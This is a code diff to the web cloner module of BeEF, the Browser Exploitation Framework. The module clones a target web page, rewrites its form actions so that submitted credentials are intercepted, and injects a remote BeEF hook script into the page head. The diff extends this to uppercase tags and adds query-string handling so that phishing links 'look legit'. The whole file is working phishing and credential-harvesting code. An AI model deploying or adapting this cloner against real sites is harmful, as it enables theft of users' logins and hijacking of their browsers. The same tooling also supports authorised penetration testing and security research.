@@ -1,17 +1,7 @@
 #
-#   Copyright 2012 Wade Alcorn wade@bindshell.net
-#
-#   Licensed under the Apache License, Version 2.0 (the "License");
-#   you may not use this file except in compliance with the License.
-#   You may obtain a copy of the License at
-#
-#       http://www.apache.org/licenses/LICENSE-2.0
-#
-#   Unless required by applicable law or agreed to in writing, software
-#   distributed under the License is distributed on an "AS IS" BASIS,
-#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-#   See the License for the specific language governing permissions and
-#   limitations under the License.
+# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
 #
 module BeEF
   module Extension
@@ -57,7 +47,7 @@ module BeEF
               File.open("#{@cloned_pages_dir + output_mod}", 'w') do |out_file|
                 File.open("#{@cloned_pages_dir + output}", 'r').each do |line|
                   # Modify the <form> line changing the action URI to / in order to be properly intercepted by BeEF
-                  if line.include?("<form ")
+                  if line.include?("<form ") || line.include?("<FORM ")
                     line_attrs = line.split(" ")
                     c = 0
                     cc = 0
@@ -87,7 +77,7 @@ module BeEF
                     print_info "Form action value changed in order to be intercepted :-D"
                     out_file.print mod_form
                     # Add the BeEF hook
-                  elsif line.include?("</head>") && @config.get('beef.extension.social_engineering.web_cloner.add_beef_hook')
+                  elsif (line.include?("</head>") || line.include?("</HEAD>")) && @config.get('beef.extension.social_engineering.web_cloner.add_beef_hook')
                     out_file.print add_beef_hook(line)
                     print_info "BeEF hook added :-D"
                   else
@@ -102,6 +92,13 @@ module BeEF
             print_info "Page at URL [#{url}] has been cloned. Modified HTML in [cloned_paged/#{output_mod}]"
 
             file_path = @cloned_pages_dir + output_mod # the path to the cloned_pages directory where we have the HTML to serve
+
+            # if the user wants to clone http://a.com/login.jsp?cas=true&ciccio=false , split the URL mounting only the path.
+            # then the phishing link can be used anyway with all the proper parameters to looks legit.
+            if mount.include?("?")
+              mount = mount.split("?").first
+              print_info "Normalizing mount point. You can still use params for the phishing link."
+            end
 
             # Check if the original URL can be framed
             frameable = is_frameable(url)
@@ -128,7 +125,11 @@ module BeEF
         private
         # Replace </head> with <BeEF_hook></head>
         def add_beef_hook(line)
-           line.gsub!("</head>","<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</head>")
+           if line.include?("</head>")
+             line.gsub!("</head>","<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</head>")
+           elsif
+             line.gsub!("</HEAD>","<script type=\"text/javascript\" src=\"#{@beef_hook}\"></script>\n</HEAD>")
+           end
            line
         end
 
@@ -136,22 +137,29 @@ module BeEF
         # check if the original URL can be framed. NOTE: doesn't check for framebusting code atm
         def is_frameable(url)
           result = true
-          uri = URI(url)
-          http = Net::HTTP.new(uri.host, uri.port)
-          if uri.scheme == "https"
-            http.use_ssl = true
-            http.verify_mode = OpenSSL::SSL::VERIFY_NONE
-          end
-          request = Net::HTTP::Get.new(uri.request_uri)
-          response = http.request(request)
-          frame_opt = response["X-Frame-Options"]
-
-          if frame_opt != nil
-            if frame_opt.casecmp("DENY") == 0 || frame_opt.casecmp("SAMEORIGIN") == 0
-              result = false
+          begin
+            uri = URI(url)
+            http = Net::HTTP.new(uri.host, uri.port)
+            if uri.scheme == "https"
+              http.use_ssl = true
+              http.verify_mode = OpenSSL::SSL::VERIFY_NONE
             end
+            request = Net::HTTP::Get.new(uri.request_uri)
+            response = http.request(request)
+            frame_opt = response["X-Frame-Options"]
+
+            if frame_opt != nil
+              if frame_opt.casecmp("DENY") == 0 || frame_opt.casecmp("SAMEORIGIN") == 0
+                result = false
+              end
+            end
+            print_info "Page can be framed: [#{result}]"
+          rescue Exception => e
+            result = false
+            print_error "Unable to determine if page can be framed. Page can be framed: [#{result}]"
+            print_debug e
+            #print_debug e.backtrace
           end
-          print_info "Page can be framed: [#{result}]"
           result
         end
 
